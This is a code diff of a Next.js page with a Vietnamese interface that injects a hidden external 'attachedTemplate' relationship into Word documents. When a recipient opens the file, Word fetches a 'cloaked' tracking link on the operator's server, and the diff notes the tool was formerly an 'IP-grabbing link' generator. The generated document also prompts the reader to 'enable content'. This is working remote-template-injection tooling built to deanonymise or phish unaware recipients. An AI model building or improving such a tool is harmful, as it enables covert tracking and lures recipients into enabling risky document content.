@@ -10,42 +10,42 @@ import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
 import { useToast } from "@/hooks/use-toast"
-import { getIpLinksAction, type IpLinkConfig } from "@/app/actions/ip-links"
+import { getCloakedLinksAction, type CloakedLinkConfig } from "@/app/actions/cloaked-links"
 import { FilePlus2, UploadCloud, Download, AlertCircle, FileSignature, FileUp } from "lucide-react"
 import { useRouter } from "next/navigation"
 import PizZip from "pizzip"
 import { saveAs } from "file-saver"
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
+import { getCurrentUserAction } from "@/app/actions/users"
 
 export default function FileCreatorPage() {
   const { toast } = useToast()
   const router = useRouter()
-  const [ipLinks, setIpLinks] = React.useState<IpLinkConfig[]>([])
+  const [cloakedLinks, setCloakedLinks] = React.useState<CloakedLinkConfig[]>([])
   const [selectedLink, setSelectedLink] = React.useState<string>("")
   const [selectedFile, setSelectedFile] = React.useState<File | null>(null)
   const [isLoading, setIsLoading] = React.useState(false)
   const [origin, setOrigin] = React.useState("")
 
   React.useEffect(() => {
-    try {
-      const user = JSON.parse(sessionStorage.getItem('user') || '{}');
-      if (!user.permissions?.includes('admin') && !user.permissions?.includes('file_creator')) {
-        toast({ title: 'Truy cập bị từ chối', description: 'Bạn không có quyền truy cập trang này.', variant: 'destructive' });
-        router.replace('/dashboard');
-      }
-    } catch (e) {
-      router.replace('/login');
+    async function checkAuth() {
+        const user = await getCurrentUserAction();
+        if (!user || (!user.permissions.includes('admin') && !user.permissions.includes('file_creator'))) {
+            toast({ title: 'Truy cập bị từ chối', description: 'Bạn không có quyền truy cập trang này.', variant: 'destructive' });
+            router.replace('/dashboard');
+        }
     }
+    checkAuth();
     
     if (typeof window !== 'undefined') {
       setOrigin(window.location.origin)
     }
 
-    async function loadIpLinks() {
-      const links = await getIpLinksAction()
-      setIpLinks(links)
+    async function loadCloakedLinks() {
+      const links = await getCloakedLinksAction()
+      setCloakedLinks(links)
     }
-    loadIpLinks()
+    loadCloakedLinks()
   }, [router, toast])
 
   const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
@@ -89,7 +89,7 @@ export default function FileCreatorPage() {
         
         let relsContent = relsFile.asText()
         
-        const trackingUrl = `${origin}/l/${selectedLink}`
+        const trackingUrl = `${origin}/r/${selectedLink}`
         const relationshipId = `rId${Date.now()}`
         const newRel = `<Relationship Id="${relationshipId}" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="${trackingUrl}" TargetMode="External"/>`
 
@@ -163,7 +163,7 @@ export default function FileCreatorPage() {
 <w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Tài liệu này được tạo tự động để phục vụ mục đích theo dõi. Vui lòng bật nội dung nếu được yêu cầu.</w:t></w:r></w:p></w:body></w:document>`);
 
         const wordRelsDir = wordDir.folder("_rels");
-        const trackingUrl = `${origin}/l/${selectedLink}`;
+        const trackingUrl = `${origin}/r/${selectedLink}`;
         const relationshipId = `rId${Date.now()}`;
         const relsContent = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="${relationshipId}" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="${trackingUrl}" TargetMode="External"/></Relationships>`;
@@ -219,15 +219,15 @@ export default function FileCreatorPage() {
                   <Label>1. Chọn Link Theo Dõi</Label>
                   <Select value={selectedLink} onValueChange={setSelectedLink}>
                     <SelectTrigger>
-                      <SelectValue placeholder="Chọn một link đã tạo..." />
+                      <SelectValue placeholder="Chọn một link bọc đã tạo..." />
                     </SelectTrigger>
                     <SelectContent>
-                      {ipLinks.length > 0 ? ipLinks.map(link => (
+                      {cloakedLinks.length > 0 ? cloakedLinks.map(link => (
                         <SelectItem key={link.id} value={link.id}>
-                          {link.title} ({origin}/l/{link.id})
+                          {link.title} ({origin}/r/{link.id})
                         </SelectItem>
                       )) : (
-                        <SelectItem value="none" disabled>Không có link nào. Vui lòng tạo ở trang 'Tạo Link Lấy IP'.</SelectItem>
+                        <SelectItem value="none" disabled>Không có link nào. Vui lòng tạo ở trang 'Link Bọc'.</SelectItem>
                       )}
                     </SelectContent>
                   </Select>
